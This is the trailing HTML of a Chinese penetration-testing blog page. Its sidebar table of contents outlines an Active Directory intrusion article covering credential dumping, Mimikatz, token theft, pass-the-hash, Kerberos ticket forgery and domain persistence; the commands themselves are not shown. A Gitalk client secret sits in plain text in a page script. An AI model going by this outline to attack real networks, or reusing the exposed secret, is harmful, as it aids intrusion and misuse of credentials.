class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Windows杂谈</div></div></a></div><div class="next-post pull-right"><a href="/2020/07/26/Office_0x01/"><img class="next-cover" src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/111.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于邮件钓鱼的哪些事</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">98</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Ascotbe" target="_blank" title=""><i class="fa fa-github"></i></a><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，如有违规和作者无关！文章图片均在GitHub~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">搭建域环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81IP"><span class="toc-number">1.1.</span> <span class="toc-text">配置静态IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">配置域环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%85%A5%E4%BA%8E%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.</span> <span class="toc-text">加入于环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN"><span class="toc-number">2.1.</span> <span class="toc-text">SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">端口连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.</span> <span class="toc-text">配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.</span> <span class="toc-text">用户信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#net%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.4.1.</span> <span class="toc-text">net参数详解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">2.4.2.</span> <span class="toc-text">查看域用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">2.4.3.</span> <span class="toc-text">查看域管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7ip"><span class="toc-number">2.4.4.</span> <span class="toc-text">快速定位域控ip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">2.4.5.</span> <span class="toc-text">查看域控制器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.5.</span> <span class="toc-text">内网主机发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%85%B1%E4%BA%AB%E8%B5%84%E6%96%99"><span class="toc-number">2.5.1.</span> <span class="toc-text">查看共享资料</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Barp%E8%A1%A8"><span class="toc-number">2.5.2.</span> <span class="toc-text">查看arp表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bhosts%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.3.</span> <span class="toc-text">查看hosts文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bdns%E7%BC%93%E5%AD%98"><span class="toc-number">2.5.4.</span> <span class="toc-text">查看dns缓存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86"><span class="toc-number">2.6.</span> <span class="toc-text">会话收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%87%AD%E8%AF%81"><span class="toc-number">2.7.</span> <span class="toc-text">收集凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DPAP"><span class="toc-number">2.8.</span> <span class="toc-text">DPAP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86Chrome%E5%AF%86%E7%A0%81"><span class="toc-number">2.8.1.</span> <span class="toc-text">解密Chrome密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86Credential"><span class="toc-number">2.8.2.</span> <span class="toc-text">解密Credential</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">2.9.</span> <span class="toc-text">域信任</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">2.9.1.</span> <span class="toc-text">查看域信任</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BC%A0%E9%80%81"><span class="toc-number">2.10.</span> <span class="toc-text">域传送</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-number">2.10.1.</span> <span class="toc-text">windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux"><span class="toc-number">2.10.2.</span> <span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E8%AE%B0%E5%BD%95%E8%8E%B7%E5%8F%96"><span class="toc-number">2.11.</span> <span class="toc-text">DNS记录获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-Server"><span class="toc-number">2.11.1.</span> <span class="toc-text">Windows Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9EWindows-Server"><span class="toc-number">2.11.2.</span> <span class="toc-text">非Windows Server</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WIFI"><span class="toc-number">2.12.</span> <span class="toc-text">WIFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPP"><span class="toc-number">2.13.</span> <span class="toc-text">GPP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Seatbelt"><span class="toc-number">2.14.</span> <span class="toc-text">Seatbelt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bloodhound"><span class="toc-number">2.15.</span> <span class="toc-text">Bloodhound</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%A1%E5%85%94%E4%B8%89%E7%AA%9F"><span class="toc-number">3.</span> <span class="toc-text">狡兔三窟</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E5%87%BA%E7%BD%91"><span class="toc-number">3.1.</span> <span class="toc-text">是否出网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.2.</span> <span class="toc-text">端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#netsh"><span class="toc-number">3.2.1.</span> <span class="toc-text">netsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh"><span class="toc-number">3.2.2.</span> <span class="toc-text">ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%A7%A3%E9%87%8A"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">参数解释</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#reGeorg"><span class="toc-number">3.2.3.</span> <span class="toc-text">reGeorg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EarthWorm"><span class="toc-number">3.2.4.</span> <span class="toc-text">EarthWorm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lcx"><span class="toc-number">3.2.5.</span> <span class="toc-text">lcx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powercat"><span class="toc-number">3.2.6.</span> <span class="toc-text">powercat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%A7%A3%E9%87%8A-1"><span class="toc-number">3.2.6.1.</span> <span class="toc-text">参数解释</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-number">3.2.6.2.</span> <span class="toc-text">反向链接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E9%93%BE%E6%8E%A5"><span class="toc-number">3.2.6.3.</span> <span class="toc-text">正向链接</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mssql"><span class="toc-number">3.2.7.</span> <span class="toc-text">mssql</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Administrator%E6%8F%90%E6%9D%83%E5%88%B0SYSTEM"><span class="toc-number">4.1.</span> <span class="toc-text">Administrator提权到SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#at%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.1.</span> <span class="toc-text">at本地命令提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sc%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.2.</span> <span class="toc-text">sc命令提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.</span> <span class="toc-text">CVE漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%BB%84%E6%88%90"><span class="toc-number">5.1.</span> <span class="toc-text">密码组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E5%8F%96"><span class="toc-number">5.2.</span> <span class="toc-text">本地提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9FHash"><span class="toc-number">5.3.</span> <span class="toc-text">域Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NTDSUTIL"><span class="toc-number">5.3.1.</span> <span class="toc-text">NTDSUTIL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mimikatz"><span class="toc-number">5.3.2.</span> <span class="toc-text">Mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AccessToken%E7%AA%83%E5%8F%96"><span class="toc-number">5.3.3.</span> <span class="toc-text">AccessToken窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8Fincognito"><span class="toc-number">5.3.3.1.</span> <span class="toc-text">程序incognito</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF%E4%B8%8B%E7%9A%84incognito%E6%A8%A1%E5%9D%97"><span class="toc-number">5.3.3.2.</span> <span class="toc-text">MSF下的incognito模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Invoke-TokenManipulation-ps1%E8%84%9A%E6%9C%AC"><span class="toc-number">5.3.3.3.</span> <span class="toc-text">Invoke-TokenManipulation.ps1脚本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8token%E8%8E%B7%E5%BE%97TrustedInstaller%E6%9D%83%E9%99%90"><span class="toc-number">5.3.3.4.</span> <span class="toc-text">利用token获得TrustedInstaller权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-number">5.4.</span> <span class="toc-text">密码喷射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">5.5.</span> <span class="toc-text">Kerberoasting</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">6.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E9%93%BE%E6%8E%A5"><span class="toc-number">6.1.</span> <span class="toc-text">账号密码链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPC"><span class="toc-number">6.1.1.</span> <span class="toc-text">IPC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Psexec"><span class="toc-number">6.1.2.</span> <span class="toc-text">Psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI-amp-WINRM"><span class="toc-number">6.1.3.</span> <span class="toc-text">WMI&amp;WINRM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Schtasks"><span class="toc-number">6.1.4.</span> <span class="toc-text">Schtasks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AT"><span class="toc-number">6.1.5.</span> <span class="toc-text">AT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SC"><span class="toc-number">6.1.6.</span> <span class="toc-text">SC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REG"><span class="toc-number">6.1.7.</span> <span class="toc-text">REG</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DCOM"><span class="toc-number">6.1.8.</span> <span class="toc-text">DCOM</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH"><span class="toc-number">6.2.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#impacket%E5%A5%97%E4%BB%B6"><span class="toc-number">6.2.1.</span> <span class="toc-text">impacket套件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Invoke-TheHash%E5%A5%97%E4%BB%B6"><span class="toc-number">6.2.2.</span> <span class="toc-text">Invoke-TheHash套件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">6.3.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Relay"><span class="toc-number">6.4.</span> <span class="toc-text">NTLM-Relay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB-1"><span class="toc-number">6.5.</span> <span class="toc-text">域信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBKerberos"><span class="toc-number">6.6.</span> <span class="toc-text">攻击Kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.6.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.6.2.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Export-the-ticket"><span class="toc-number">6.6.3.</span> <span class="toc-text">Export the ticket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE"><span class="toc-number">6.6.4.</span> <span class="toc-text">委派</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E7%BB%B4%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">域维权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DSRM"><span class="toc-number">7.1.</span> <span class="toc-text">DSRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO"><span class="toc-number">7.2.</span> <span class="toc-text">GPO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSP"><span class="toc-number">7.3.</span> <span class="toc-text">SSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Skeleton-Key"><span class="toc-number">7.4.</span> <span class="toc-text">Skeleton Key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/20/test/" title="test"><img src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/130.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="test"/></a><div class="content"><a class="title" href="/2021/11/20/test/" title="test">test</a><time datetime="2021-11-20T10:45:42.000Z" title="发表于 2021-11-20 18:45:42">2021-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro"><img src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/121.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Office Excel Macro"/></a><div class="content"><a class="title" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">Office Excel Macro</a><time datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台"><img src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/120.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从零开始编写XSS平台"/></a><div class="content"><a class="title" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台">从零开始编写XSS平台</a><time datetime="2021-01-08T10:45:42.000Z" title="发表于 2021-01-08 18:45:42">2021-01-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析"><img src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/119.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux ELF格式解析"/></a><div class="content"><a class="title" href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析">Linux ELF格式解析</a><time datetime="2020-12-06T15:45:42.000Z" title="发表于 2020-12-06 23:45:42">2020-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/20/StackOverflow_0x02/" title="栈溢出总结（0x02）"><img src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/118.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈溢出总结（0x02）"/></a><div class="content"><a class="title" href="/2020/11/20/StackOverflow_0x02/" title="栈溢出总结（0x02）">栈溢出总结（0x02）</a><time datetime="2020-11-20T10:45:42.000Z" title="发表于 2020-11-20 18:45:42">2020-11-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2021 By ascotbe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk({
      clientID: '2b0d9f936769aea333c8',
      clientSecret: '92a2ac17a3aa5ae238bea3a4369aa6379d809aff',
      repo: 'https://github.com/Ascotbe/Ascotbe.github.io',
      owner: 'Ascotbe',
      admin: ['Ascotbe'],
      id: '3a103385fc9932f0511e822211e8547a',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: false,
      pagerDirection: 'last',
      createIssueManually: false,
      updateCountCallback: commentCount
    })
    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Bronya.model.json"},"display":{"position":"right","width":400,"height":500,"hOffset":-110,"vOffset":-40},"mobile":{"show":false},"log":false});</script></body></html>